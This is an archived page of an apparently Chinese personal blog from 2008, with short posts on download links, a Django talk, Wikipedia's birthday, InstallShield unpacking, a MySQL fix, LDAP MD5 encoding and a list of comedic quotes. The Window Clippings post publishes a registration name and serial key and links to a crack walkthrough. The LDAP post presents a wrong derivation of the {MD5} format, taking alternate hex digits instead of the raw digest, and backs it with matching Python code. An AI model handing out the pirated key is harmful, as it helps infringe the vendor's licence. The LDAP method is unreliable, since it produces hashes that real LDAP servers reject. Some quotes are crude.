+<p>Please note that this is not the final product, the “OC’s Magnetic Perpetual Motion Machine” (which is a bit more complicated and, AFAIK, not unproven to work so far). I admit that this could cause some confusion, but this video really shows only some odd ‘anomaly’ observed during the construction and trying different configurations. There is no over-unity, no infinite long runs, so don’t jump into conclusions. Magnetic perpetual motion machines can’t possibly work, didn’t you know?</p>
+
+<p>* Why is the lighting so bad/not showing the whole device/hidden motors/batteries/whatever?<br>
+
+1. Nobody cares when shooting a video (which proves nothing) for a few interested fellows.<br>
+
+2. Even if there was everything you could imagine to improve, it’s still only a video on YouTube. The world is in serious trouble if that would be enough to convince you.</p>
+
+<p>For more information, visit Steorn’s forum at http://www.steorn.com/forum/, where the always open development has been taking place.</p>
+
+<p>囧，orz，随便推荐一个超猛网站。<a href="http://appweblogic.most.gov.cn/gzwd/index.jsp?&amp;page=2">http://appweblogic.most.gov.cn/gzwd/index.jsp?&amp;page=2</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-22T20:47:26+08:00">2008-01-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622646"  rel="bookmark" >
+              <h2 class="card-title">HP网站softpaq FTP下载地址转HTTP</h2>
+            </a>
+            <p class="card-text"><p><a href="ftp://ftp.hp.com/pub/softpaq/sp37501-38000/sp37952.exe">ftp://ftp.hp.com/pub/softpaq/sp37501-38000/sp37952.exe</a></p>
+
+<p>对应HTTP地址为：</p>
+
+<p><a href="http://h30318.www3.hp.com/pub/softpaq/sp37501-38000/sp37952.exe">http://h30318.www3.hp.com/pub/softpaq/sp37501-38000/sp37952.exe</a></p>
+
+<p>用迅雷下载HTTP的速度比FTP快2-10倍</p>
+
+<p>我上一篇日志记录了<a href="http://initiative.yo2.cn/archives/442624">Mozilla插件https转http地址</a>。用迅雷下载同样可以增加速度。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-22T16:22:00+08:00">2008-01-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622552"  rel="bookmark" >
+              <h2 class="card-title">[Python]Google出的Django视频教程</h2>
+            </a>
+            <p class="card-text"><p><a href="http://youtube.com/watch?v=p-WXiqrzAf8">http://youtube.com/watch?v=p-WXiqrzAf8</a></p>
+
+<p>Google TechTalks<br>
+
+April 26, 2006</p>
+
+<p>Jacob Kaplan-Moss</p>
+
+<p>ABSTRACT<br>
+
+Django is one of the premier web frameworks for Python, and is often compared to Ruby-on-Rails. Jacob is one of the lead developers on Django.</p>
+
+<p><object width="425" height="355"><param name="movie" value="http://www.youtube.com/v/p-WXiqrzAf8&amp;rel=1">
+
+<param name="wmode" value="transparent">
+
+<embed src="http://www.youtube.com/v/p-WXiqrzAf8&amp;rel=1" type="application/x-shockwave-flash" wmode="transparent" width="425" height="355"></object></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-19T14:09:07+08:00">2008-01-19</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622520"  rel="bookmark" >
+              <h2 class="card-title">半导体过了，哦也</h2>
+            </a>
+            <p class="card-text"><p>发帖庆祝～～～～～～意外的惊喜啊</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-18T22:19:59+08:00">2008-01-18</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622402"  rel="bookmark" >
+              <h2 class="card-title">Wikipedia：7周岁快乐！</h2>
+            </a>
+            <p class="card-text"><p><img src="http://www.readwriteweb.com/images/wikipedia-logo.jpg" alt="wikipedia" width="110" height="124"></p>
+
+<p>今天的新闻：除了<a href="http://blog.twitter.com/2008/01/macworld.html">Macworld的消息瘫痪了Twitter</a>，还有一件重要的事情：<a href="http://www.wikipedia.org/">Wikipedia</a> <a href="http://en.wikipedia.org/wiki/Wikipedia:Wikipedia_Day">7 周岁了</a>。从2001年1月15日Wikipedia建站以来，维基百科诞生了2,174,371个英文条目（我写这篇blog的时候），wikipedia.org是世界排名第九的网站（更具Alexa）。Wikipedia诞生了六个子项目：：Wiktionary，Wikibooks，Wikinews，Wikiquote，Wikisource和Wikiversity</p>
+
+<p>现在Wikipedia有近250种语言，9百多万文章，150多万图片，一千万注册用户，75,000个作出贡献的作者。</p>
+
+<p><a href="http://tools.wikimedia.de/~leon/stats/wikicharts/index.php?lang=en&amp;wiki=enwiki&amp;ns=articles&amp;limit=100&amp;month=09%2F2007&amp;mode=view">WikiCharts显示</a>当今最流行的条目是它<a href="http://en.wikipedia.org/wiki/Wiki?redirect=no">自身的定义</a>：什么是wiki？</p>
+
+<p>Wikipedia同时也记载了当今文化，就像《哈利波特》、《光晕》等。Wikipedia还从侧面反映了事物的流行程度：例如<a href="http://en.wikipedia.org/wiki/Cloverfield?redirect=no">Cloverfield</a>条目的页面，在过去两周每天都有 261,000 PV。</p>
+
+<p>还有更加好玩的：<a href="http://www.wikirage.com/">Wikirage</a>。Wikirage可以跟踪条目编辑频繁程度得出：哪些条目争论最多。毫无疑问，今天争论最多的条目是<a href="http://en.wikipedia.org/wiki/MacBook_Air">MacBook Air</a></p>
+
+<p>如果250个语言版本的Wikipedia是个恐怖的数字，那么其中有一个版本是最有用的：简写版(<a href="http://simple.wikipedia.org/wiki/Main_Page">Simple English</a>)：用不超过1500个英文单词描述一个条目。例如 Harry Potter 的<a href="http://en.wikipedia.org/wiki/Harry_Potter">全文描述</a>是：</p>
+
+<blockquote>
+
+<p>“Harry Potter is a series of seven fantasy novels written by British author J. K. Rowling. The books chronicle the adventures of the eponymous adolescent wizard Harry Potter, together with Ron Weasley and Hermione Granger, his best friends. The story is mostly set at Hogwarts School of Witchcraft and Wizardry, an academy for young wizards and witches. The central story arc concerns Harry’s struggle against the evil wizard Lord Voldemort, who killed Harry’s parents in his quest to conquer the wizarding world.”</p>
+
+</blockquote>
+
+<p><a href="http://simple.wikipedia.org/wiki/Harry_Potter">简化</a>英文版：</p>
+
+<blockquote>
+
+<p>“The Harry Potter books are a popular series of fantasy books by J. K. Rowling. The character Harry Potter is the hero in the stories.</p>
+
+<p>In the books, the fantasy is about magic. Harry Potter is born with the power to do magic. He soon discovers that there is a whole lot of magic people in the world, living unknown to most ordinary people. When he is eleven, he is invited to go to a boarding school for young witches and wizards. Each book tells about one year of his life at school, about the people that he meets there, the things that he learns, and his adventures.”</p>
+
+</blockquote>
+
+<p>简写版几乎涵盖了完整版的所有内容。但是完整版有超过7000个单词。</p>
+
+<p>恩，WIkipedia生日快乐！虽然wikipedia和传统百科全书相比缺乏权威性和<a href="http://www.news.com/2100-1038_3-5997332.html">准确性</a>，还是毫无疑问Wikipedia是最方便的 <img src='http://image.cache.yo2blog.com/wp-includes/images/smilies/icon_smile.gif' alt=':-)' class='wp-smiley'></p>
+
+<p>Source: Read/WriteWeb：<a href="http://feeds.feedburner.com/~r/readwriteweb/~3/217345512/wikipedia_turns_seven.php">Happy Birthday: Wikipedia Turns 7 Today</a></p>
+
+<p>最后吼一句，Read-only，但是不用翻墙的镜像！http://labs.dormforce.net/wikipedia/Great_fire_wall/</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-16T11:55:01+08:00">2008-01-16</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622359"  rel="bookmark" >
+              <h2 class="card-title">超级龌龊的Macrovision  - 继续扯谈unpack InstallShield的安装包</h2>
+            </a>
+            <p class="card-text"><p>前年的<a href="http://dormforce.net/Blog/electronixtar/archive/2006/10/04/10829.aspx">blog</a>今天又遇到这个问题了，再次下载<a href="http://www.installshield.com/">InstallShield</a>来提取工具……<br>
+
+<a href="http://saturn.installshield.com/is/11/windows/premier/wrapped/installshield11.exe">http://saturn.installshield.com/is/11/windows/premier/wrapped/installshield11.exe</a><br>
+
+<a href="http://saturn.installshield.com/is/12/windows/domestic/premier/installshield12.exe">http://saturn.installshield.com/is/12/windows/domestic/premier/installshield12.exe</a><br>
+
+<a href="http://saturn.installshield.com/product/is/2008/domestic/premier/installshield2008.exe">http://saturn.installshield.com/product/is/2008/domestic/premier/installshield2008.exe</a></p>
+
+<p>ISCab.exe的用法在这里：<a href="http://helpnet.installshield.com/robo/projects/installshield11helplib/ISCabExe.htm">http://helpnet.installshield.com/robo/projects/installshield11helplib/ISCabExe.htm</a></p>
+
+<p>今晚花了3个小时，提取InstallShield 10, 11, 2008里的解包工具，加入<a href="http://legroom.net/software/uniextract">UniExtract</a>小工具，建立一个<a href="http://code.google.com/p/uniextract/">开源项目</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-14T20:33:01+08:00">2008-01-14</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622348"  rel="bookmark" >
+              <h2 class="card-title">Window Clippings 2.0 截图工具 附注册码</h2>
+            </a>
+            <p class="card-text"><p>看到<a href="http://www.appinn.com/">小众软件</a>推荐了一款截图软件，<a href="http://eng.wiziple.net/5">PicPick</a>，觉得世界上肯定有更好的替代，所以Google了一个更好的：<a href="http://www.windowclippings.com/">Window Clippings</a>，支持多屏幕、命令行参数，不用长期驻留内存，开放接口（C++和.NET）等等，难为可贵的是，Windows Clippings只有238KB，实在是杀人灭口居家旅行必备工具，口黑口黑</p>
+
+<blockquote>
+
+<p>Features:<br>
+
+Use keyboard hot key<br>
+
+Copy image to clipboard<br>
+
+Save image to disk<br>
+
+Automatically generate file name<br>
+
+Prompt for storage location and file name<br>
+
+Send image to OneNote<br>
+
+Clear window background<br>
+
+Include window shadow<br>
+
+Set background color<br>
+
+Include parent in selection<br>
+
+Include multiple windows in selection<br>
+
+Launch Options window from command line<br>
+
+Launch capture screen from command line<br>
+
+Hide notification icon Yes Yes<br>
+
+Convert to black and white<br>
+
+Include mouse pointer<br>
+
+Allow object selection<br>
+
+Freeze window during capture<br>
+
+Delay before capture (to capture pop-ups)<br>
+
+Copy file to clipboard<br>
+
+Configurable image formats<br>
+
+Post-save events<br>
+
+Register and configure add-ins<br>
+
+Crop or expand selection<br>
+
+Quick select desktop, work area or monitor</p>
+
+</blockquote>
+
+<p><a href="http://www.windowclippings.com/download/2.0.28/x86/WindowClippings.exe">32bit 下载</a> <a href="http://www.windowclippings.com/download/2.0.28/x64/WindowClippings.exe">64bit 下载</a><br>
+
+改天有心情了写个撕裂效果的插件，把<a href="http://www.moodysoft.com/spx/">SPX</a>截图工具也踢飞了～～～口黑口黑</p>
+
+<p><a href="http://bbs.sjtu.edu.cn/bbstcon?board=Crack&amp;reid=1187761912">破解过程</a><br>
+
+<img src="http://bbs.sjtu.edu.cn/file/Crack/1187761896159694.GIF" alt="Windows Clippings Serial" width="452" height="469"><br>
+
+注册名：romanogl<br>
+
+注册码：261C0CDF-8D35149F-1C42D8DF-BAFF475A-12FE0CDB</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-13T23:29:25+08:00">2008-01-13</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622305"  rel="bookmark" >
+              <h2 class="card-title">MySQL5 STOPPING server from pid file 错误</h2>
+            </a>
+            <p class="card-text"><p><code><br>
+
+Starting mysqld daemon with databases from /var/lib/mysql<br>
+
+STOPPING server from pid file /var/run/mysqld/mysqld.pid<br>
+
+050810 11:29:48 mysqld ended<br></code><br>
+
+解决办法：找到MySQL配置文件里的 <code>socket = /tmp/mysql.sock</code></p>
+
+<p>检查<code>/tmp/mysql.sock</code>权限</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-12T23:10:39+08:00">2008-01-12</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622281"  rel="bookmark" >
+              <h2 class="card-title">LDAP的MD5算法</h2>
+            </a>
+            <p class="card-text"><p>和php、MySQL的 md5() 函数不一样，LDAP里用户认证时候的md5算法有点不一样，留个记录。来源：<a href="http://www.openldap.org/lists/openldap-software/200507/msg00417.html">OpenLDAP邮件列表</a></p>
+
+<p>首先说说php和MySQL的md5函数，例如：<br>
+
+<code>md5("testing") = "ae2b1fca515949e5d54fb22b8ed95575";</code><br>
+
+这个和Python的 <code>hexdigest()</code> 函数结果是一样的<br>
+
+<code>&gt;&gt;&gt; md5(”testing”).hexdigest()<br>
+
+‘ae2b1fca515949e5d54fb22b8ed95575′<br></code></p>
+
+<p>在LDAP里怎么表示的呢？<br>
+
+<code><br>
+
+dn: cn=md5user,dc=my,dc=example,dc=com<br>
+
+objectClass: simpleSecurityObject<br>
+
+objectClass: organizationalRole<br>
+
+cn: md5user<br>
+
+description: MD5USER<br>
+
+userPassword: {MD5}CgIBDAUFBA4NBAsCCA0FBw==<br></code>]</p>
+
+<p>怎么得到的呢？</p>
+
+<p>我们研究 字符串 testing 的 MD5 字串：ae 2b 1f ca 51 59 49 e5 d5 4f b2 2b 8e d9 55 75<br>
+
+首先隔一个字符提取一个字符，得到一个新的字符串，例如：<br>
+
+<code><span style="color:red;">a</span>e&nbsp;<span style="color:red;">2</span>b&nbsp;<span style="color:red;">1</span>f&nbsp;<span style="color:red;">c</span>a&nbsp;<span style="color:red;">5</span>1&nbsp;<span style="color:red;">5</span>9&nbsp;<span style="color:red;">4</span>9&nbsp;<span style="color:red;">e</span>5&nbsp;<span style="color:red;">d</span>5&nbsp;<span style="color:red;">4</span>f&nbsp;<span style="color:red;">b</span>2&nbsp;<span style="color:red;">2</span>b&nbsp;<span style="color:red;">8</span>e&nbsp;<span style="color:red;">d</span>9&nbsp;<span style="color:red;">5</span>5&nbsp;<span style="color:red;">7</span>5</code><br>
+
+得到：<br>
+
+<code>a&nbsp;&nbsp;2&nbsp;&nbsp;1&nbsp;&nbsp;c&nbsp;&nbsp;5&nbsp;&nbsp;5&nbsp;&nbsp;4&nbsp;&nbsp;e&nbsp;&nbsp;d&nbsp;&nbsp;4&nbsp;&nbsp;b&nbsp;&nbsp;2&nbsp;&nbsp;8&nbsp;&nbsp;d&nbsp;&nbsp;5&nbsp;&nbsp;7</code><br>
+
+那么把每一位看成十六进制，转换成对应的ASCII字符，例如第一位的 <code>a</code>，十六进制是 \x0A，也就是个回车：<code>\n</code>，把转换后的ASCII字符连起来，那么我们可以得到一串字符，不可显示的：<code>'\n\x02\x01\x0c\x05\x05\x04\x0e\r\x04\x0b\x02\x08\r\x05\x07'</code></p>
+
+<p>最后把这串不可打印的字符用base64编码之后，就可以得到LDAP标准的MD5字串，例如我们在Python里：<br>
+
+<code><br>
+
+&gt;&gt;&gt; '\n\x02\x01\x0c\x05\x05\x04\x0e\r\x04\x0b\x02\x08\r\x05\x07'.encode('base64'<br>
+
+).strip()<br>
+
+'CgIBDAUFBA4NBAsCCA0FBw=='<br></code></p>
+
+<blockquote>
+
+<p>strip()是去掉一个没有用的回车符号。</p>
+
+</blockquote>
+
+<p>最后我们用Python实现这一算法：<br>
+
+<code><br>
+
+ActivePython 2.5.1.1 (ActiveState Software Inc.) based on<br>
+
+Python 2.5.1 (r251:54863, May 1 2007, 17:47:05) [MSC v.1310 32 bit (Intel)] on<br>
+
+win32<br>
+
+Type "help", "copyright", "credits" or "license" for more information.<br>
+
+&gt;&gt;&gt; from md5 import md5<br>
+
+&gt;&gt;&gt;<br>
+
+&gt;&gt;&gt; mysql_md5 = md5("testing").hexdigest()<br>
+
+&gt;&gt;&gt; mysql_md5<br>
+
+<span style="color:red;">‘ae2b1fca515949e5d54fb22b8ed95575′</span><br>
+
+&gt;&gt;&gt; binary_md5 = ”.join([ chr(int(mysql_md5[i:i+1],16)) for i in range(0,len(mysql_md5),2)])<br>
+
+&gt;&gt;&gt; binary_md5<br>
+
+<span style="color:red;">‘\n\x02\x01\x0c\x05\x05\x04\x0e\r\x04\x0b\x02\x08\r\x05\x07′</span><br>
+
+&gt;&gt;&gt; ldap_md5 = binary_md5.encode(”base64″).strip()<br>
+
+&gt;&gt;&gt; ldap_md5<br>
+
+<span style="color:red;">‘CgIBDAUFBA4NBAsCCA0FBw==’</span><br>
+
+&gt;&gt;&gt;<br></code></p>
+
+<p>顺便说下，一个 <a href="http://www2.dormforce.net/dormid">single sign-on</a> 的系统设计还真麻烦。要实现一个password同步、LDAP认证，<a href="http://code.google.com/apis/accounts/AuthForWebApps.html">AuthSub</a>，等等，ho～～～累！</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2008-01-12T15:30:06+08:00">2008-01-12</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/622201"  rel="bookmark" >
+              <h2 class="card-title">100条最有趣的格言</h2>
+            </a>
+            <p class="card-text"><p><strong>1.</strong> The only thing that interferes with my learning is my education.</p>
+
+<p><strong>2.</strong> As far as the laws of mathematics refer to reality, they<br>
+
+are not certain; as far as they are certain, they do not refer to reality.</p>
+
+<p><strong>3.</strong> Common sense is the collection of prejudices acquired by<br>
+
+age eighteen.</p>
+
+<p><strong>4.</strong> The release of atomic energy has not created a new problem.<br>
+
+It has merely made more urgent the necessity of solving an existing one.</p>
+
+<p><strong>5.</strong> If you are out to describe the truth, leave elegance to the<br>
+
+tailor.</p>
+
+<p><strong>6.</strong> I know not with what weapons World War III will be fought,<br>
+
+but World War IV will be fought with sticks and stones.</p>
+
+<p><strong>Fredrick Nietzsche Quotes</strong></p>
+
+<p><img height="250" src="http://www.worldofbiography.com/0063-Friedrich%20Neitzsche/images/Friedrich%20Neitzsche.jpg" width="400"></p>
+
+<p><strong>7.</strong> In the beginning was nonsense, and the nonsense was with<br>
+
+God, and the nonsense was God.</p>
+
+<p><strong>8.</strong> A casual stroll through a lunatic asylum shows that faith<br>
+
+does not prove anything.</p>
+
+<p><strong>9.</strong> <span class="body">Ah, women. They make the highs higher<br>
+
+and the lows more frequent.</span></p>
+
+<p><strong>10.</strong> <span class="body">Is man one of God’s blunders? Or is God<br>
+
+one of man’s blunders?</span></p>
+
+<p><strong>11.</strong> <span class="body">Many are stubborn in pursuit of the path<br>
+
+they have chosen, few in pursuit of the goal.</span></p>
+
+<p><strong>Mark Twain Quotes</strong></p>
+
+<p><img src="http://www.richardhenzel.com/twain.jpg" width="394" height="290"></p>
+
+<p><strong>12.</strong> Be careful about reading health books. You may die of a<br>
+
+misprint.</p>
+
+<p><strong>13.</strong> Don’t go around saying the world owes you a living. The<br>
+
+world owes you nothing. It was here first.</p>
+
+<p><strong>14.</strong> I didn’t attend the funeral, but I sent a nice letter saying<br>
+
+that I approved of it.</p>
+
+<p><strong>15.</strong> I have never let my schooling interfere with my education.</p>
+
+<p><strong>16.</strong> The man who doesn’t read good books has no advantage over<br>
+
+the man who can’t read them.</p>
+
+<p><strong>17.</strong> “Why do you sit there looking like an envelope without any<br>
+
+address on it?”</p>
+
+<p><strong>Voltaire Quotes<br></strong><br>
+
+<img height="200" src="http://www.ymca-coll.edu.hk/history/photo/chapter2/voltaire.jpg" width="150" align="right"><strong>18.<br></strong>Prejudices are what fools use for reason.</p>
+
+<p><strong>19.</strong> If there were no God, it would have been necessary to invent<br>
+
+him.</p>
+
+<p><strong>20.</strong> Every man is guilty of all the good he didn’t do.</p>
+
+<p><strong>21.</strong> No snowflake in an avalanche ever feels responsible.</p>
+
+<p><strong>22.</strong> The true triumph of reason is that it enables us to get<br>
+
+along with those who do not possess it.</p>
+
+<p><strong>23.</strong> It is hard to free fools from the chains they revere.</p>
+
+<p><strong>24.</strong> There are men who can think no deeper than a fact.</p>
+
+<p><strong>25.</strong> Anyone who has the power to make you believe absurdities<br>
+
+has the power to make you commit injustices.</p>
+
+<p><strong>26.</strong> Anything too stupid to be said is sung.</p>
+
+<p><strong>27.</strong> By appreciation, we make excellence in others our own property.</p>
+
+<p><strong>28.</strong> Governments need to have both shepherds and butchers.</p>
+
+<p><strong>Plato Quotes</strong></p>
+
+<p><img height="200" src="http://www.math.technion.ac.il/~rl/pics/plato.jpg" width="150" align="left"></p>
+
+<p><strong>29.</strong> One of the penalties for refusing to participate in politics<br>
+
+is that you end up being governed by your inferiors.</p>
+
+<p><strong>30.</strong> No one ever teaches well who wants to teach, or governs<br>
+
+well who wants to govern.</p>
+
+<p><strong>31.</strong> This City is what it is because our citizens are what they<br>
+
+are.</p>
+
+<p><strong>32.</strong> Courage is knowing what not to fear.</p>
+
+<p><strong>33.</strong> The measure of a man is what he does with power.</p>
+
+<p><strong>Winston Churchill Quotes</strong></p>
+
+<p><img src="http://columns.stlcomics.com/tftlof/XX/churchill.jpg"></p>
+
+<p><strong>34.</strong> A lie gets halfway around the world before the truth has<br>
+
+a chance to get its pants on.</p>
+
+<p><strong>35.</strong> If you are going through hell, keep going.</p>
+
+<p><strong>36.</strong> The best argument against democracy is a five-minute conversation<br>
+
+with the average voter.</p>
+
+<p><strong>37.</strong> <span class="body">It has been said that democracy is the<br>
+
+worst form of government except all the others that have been tried.</span></p>
+
+<p><strong>George Carlin Quotes</strong></p>
+
+<p><img src="http://www.funnycomedymovies.com/george_carlin.jpg" width="288" height="200"></p>
+
+<p><strong>38.</strong> Think of how stupid the average person is, and realize half<br>
+
+of them are stupider than that.</p>
+
+<p><strong>39.</strong> A house is just a place to keep your stuff while you go<br>
+
+out and get more stuff.</p>
+
+<p><strong>40.</strong> Religion has convinced people that there’s an invisible<br>
+
+man…living in the sky, who watches everything you do every minute of every day.<br>
+
+And the invisible man has a list of ten specific things he doesn’t want you to do.<br>
+
+And if you do any of these things, he will send you to a special place, of burning<br>
+
+and fire and smoke and torture and anguish for you to live forever, and suffer and<br>
+
+burn and scream until the end of time. But he loves you. He loves you and he needs<br>
+
+money.</p>
+
+<p><strong>41.</strong> You know the good part about all those executions in Texas?<br>
+
+Fewer Texans.</p>
+
+<p><strong>42.</strong> Reminds me of something my third-grade teacher said to us.<br>
+
+She said, “You show me a tropical fruit and I’ll show you a cocksucker from Guatemala.”</p>
+
+<p><strong>43.</strong> I never fucked a ten, but one night, I fucked five twos.</p>
+
+<p><strong>44.</strong> What year did Jesus think it was?</p>
+
+<p><strong>45.</strong> The real reason that we can’t have the Ten Commandments<br>
+
+in a courthouse: You cannot post “Thou shalt not steal,” “Thou shalt not commit<br>
+
+adultery,” and “Thou shalt not lie” in a building full of lawyers, judges, and politicians.<br>
+
+It creates a hostile work environment.</p>
+
+<p><strong>46.</strong> Atheism is a non-prophet organization.</p>
+
+<p><strong>47.</strong> “No comment” is a comment.</p>
+
+<p><strong>48.</strong> If a man smiles all the time, he’s probably selling something<br>
+
+that doesn’t work.</p>
+
+<p><strong>49.</strong> The reason they call it the American Dream is because you<br>
+
+have to be asleep to believe it.</p>
+
+<p><strong>Steve Martin Quotes</strong></p>
+
+<p><img src="http://images.starpulse.com/Photos/Previews/Steve-Martin-pb03.jpg" width="445" height="296"></p>
+
+<p><strong>50.</strong> Boy, those French: They have a different word for everything!</p>
+
+<p><strong>51.</strong> There is one thing I would break up over, and that is if<br>
+
+she caught me with another woman. I won’t stand for that.</p>
+
+<p><strong>52.</strong> Hosting the Oscars is much like making love to a woman.<br>
+
+It’s something I only get to do when Billy Crystal is out of town.</p>
+
+<p><strong>53.</strong> I believe that sex is one of the most beautiful, natural,<br>
+
+wholesome things that money can buy.</p>
+
+<p><strong>54.</strong> You know what your problem is, it’s that you haven’t seen<br>
+
+enough movies - all of life’s riddles are answered in the movies.</p>
+
+<p><strong>55.</strong> First the doctor told me the good news: I was going to have<br>
+
+a disease named after me.</p>
+
+<p><strong>56.</strong> Why is it we don’t always recognize the moment when love<br>
+
+begins, but we always know when it ends?<br>
+
+* As Harris K. Telemacher in “L.A. Story” (1991)</p>
+
+<p><strong>Steven Colbert Quotes</strong></p>
+
+<p><img src="http://thankyoustephencolbert.org/colbertvac.jpg" width="375" height="250"></p>
+
+<p><strong>57.</strong> “To sit here at the same table with my hero, George W. Bush…I<br>
+
+feel like I’m dreaming. Somebody pinch me. You now what, I’m a pretty sound sleeper,<br>
+
+that may not be enough…Somebody shoot me in the face.”<br>
+
+-Roasting Bush at the 2006 White House Correspondents’ dinner</p>
+
+<p><strong>58.</strong> On this show, your voice will be heard - in the form of<br>
+
+my voice.</p>
+
+<p><strong>59.</strong> There’s a phrase we live by in America: “In God We Trust”.<br>
+
+It’s right there where Jesus would want it: on our money.</p>
+
+<p><strong>60.</strong> Folks, the President needs a break. He’s like a Black and<br>
+
+Decker cordless Dirt Devil vacuum. If you don’t recharge his batteries, he can’t<br>
+
+suck.</p>
+
+<p><strong>61.</strong> I’ve always been a big fan of beauty. Sure, you can’t judge<br>
+
+a book by its cover but who wants to have sex with a book?</p>
+
+<p><strong>62.</strong> Now, I don’t see color. People tell me I’m white and I believe<br>
+
+them because police officers call me “sir”.</p>
+
+<p><strong>63.</strong> Asia: Four little letters, three billion little people.</p>
+
+<p><strong>64.</strong> “There’s nothing wrong with being gay. I have plenty of<br>
+
+friends that are going to hell.”</p>
+
+<p><strong>65.</strong> Jesus forgives sinners, not criminals.</p>
+
+<p><strong>Jon Stewart Quotes</strong></p>
+
+<p><img height="250" src="http://thebosh.com/archives/jon-stewart-with-fork.jpg" width="400"></p>
+
+<p><strong>66.</strong> I celebrated Thanksgiving in an old-fashioned way. I invited<br>
+
+everyone in my neighborhood to my house, we had an enormous feast, and then I killed<br>
+
+them and took their land.</p>
+
+<p><strong>67.</strong> Insomnia is my greatest inspiration.</p>
+
+<p><strong>68.</strong> We have it. The smoking gun. The evidence. The potential<br>
+
+weapon of mass destruction we have been looking for as our pretext of invading Iraq.<br>
+
+There’s just one problem - it’s in North Korea.</p>
+
+<p><strong>69.</strong> We declared war on terror—it’s not even a noun, so, good<br>
+
+luck.</p>
+
+<p><strong>70.</strong> Here’s how bizarre the war is that we’re in in Iraq, and<br>
+
+we should have known this right from the get-go: When we first went into Iraq, Germany<br>
+
+didn’t want to go. Germany. The Michael Jordan of war took a pass.<br>
+
+Jon Stewart’s Stand-up performance at RIT, 2005</p>
+
+<p><strong>Bill Maher Quotes</strong></p>
+
+<p><img height="250" src="http://www.getincensed.com/wp-content/uploads/Bill_Maher.jpg" width="400"></p>
+
+<p><strong>71.</strong> Everything that used to be a sin is now a disease.</p>
+
+<p><strong>72.</strong> I think flying planes into a building was a faith-based<br>
+
+initiative. I think religion is a neurological disorder.</p>
+
+<p><strong>73.</strong> Religion, to me, is a bureaucracy between man and God that<br>
+
+I don’t need.</p>
+
+<p><strong>74.</strong> They’re talking about banning cigarette smoking now in any<br>
+
+place that’s used by ten or more people in a week,<br>
+
+which, I guess, means that Madonna can’t even smoke in bed.</p>
+
+<p><strong>Jerry Seinfeld Quotes</strong></p>
+
+<p><img src="http://www1.wsvn.com/images/news_articles/389x205/061216_jerry_Seinfeld.jpg" width="389" height="205"></p>
+
+<p><strong>75.</strong> Men want the same thing from their underwear that they want<br>
+
+from women: a little<br>
+
+bit of support, and a little bit of freedom.</p>
+
+<p><strong>76.</strong> Dogs are the leaders of the planet. If you see two life<br>
+
+forms, one of them’s making a poop, the other one’s carrying it for him, who would<br>
+
+you assume is in charge.</p>
+
+<p><strong>77.</strong> There’s very little advice in men’s magazines, because men<br>
+
+don’t think there’s a lot they don’t know. Women do. Women want to learn. Men think,<br>
+
+“I know what I’m doing, just show me somebody naked.”</p>
+
+<p><strong>78.</strong> Why do people give each other flowers? To celebrate various<br>
+
+important occasions, they’re killing living creatures? Why restrict it to plants?<br>
+
+“Sweetheart, let’s make up. Have this deceased squirrel.”</p>
+
+<p><strong>Larry David Quotes</strong></p>
+
+<p><strong><br>
+
+<img height="250" src="http://www.hbo.com/larrydavid/img/castandcrew/506x315_cast_larry.jpg" width="400"></strong></p>
+
+<p><strong>79.</strong> Anyone can be confident with a full head of hair. But a<br>
+
+confident bald man - there’s your diamond in the rough.</p>
+
+<p><strong>80.</strong> If you tell the truth about how you’re feeling, it becomes<br>
+
+funny.</p>
+
+<p><strong>81.</strong> I’m surprized Hitler didn’t round up the toupee people.”</p>
+
+<p><strong>Dennis Miller Quotes</strong></p>
+
+<p><img height="150" src="http://southpark.colorado.net/shared/eventscalendar/photos/Dennis-Miller.jpg" width="150" align="left"><strong>82.<br></strong>A recent police study found that you’re much more likely to get shot by<br>
+
+a fat cop if you run.</p>
+
+<p><strong>83.</strong> The average American’s day planner has fewer holes in it<br>
+
+than Ray Charles’s dart board.</p>
+
+<p><strong>84.</strong> “The only way the French are going in is if we tell them<br>
+
+we found truffles in Iraq.”</p>
+
+<p><strong>Jay Leno Quotes</strong></p>
+
+<p><img height="150" src="http://www.dsmithz28.com/wp-content/uploads/2007/09/leno.jpg" width="150" align="right"></p>
+
+<p><strong>85.</strong> Here’s something to think about: How come you never see<br>
+
+a headline like ‘Psychic Wins Lottery’?</p>
+
+<p><strong>86.</strong> The Supreme Court has ruled that they cannot have a nativity<br>
+
+scene in Washington, D.C. This wasn’t for any religious reasons. They couldn’t find<br>
+
+three wise men and a virgin.</p>
+
+<p><strong>87.</strong> Now there are more overweight people in America than average-weight<br>
+
+people. So overweight people are now average. Which means you’ve met your New Year’s<br>
+
+resolution.</p>
+
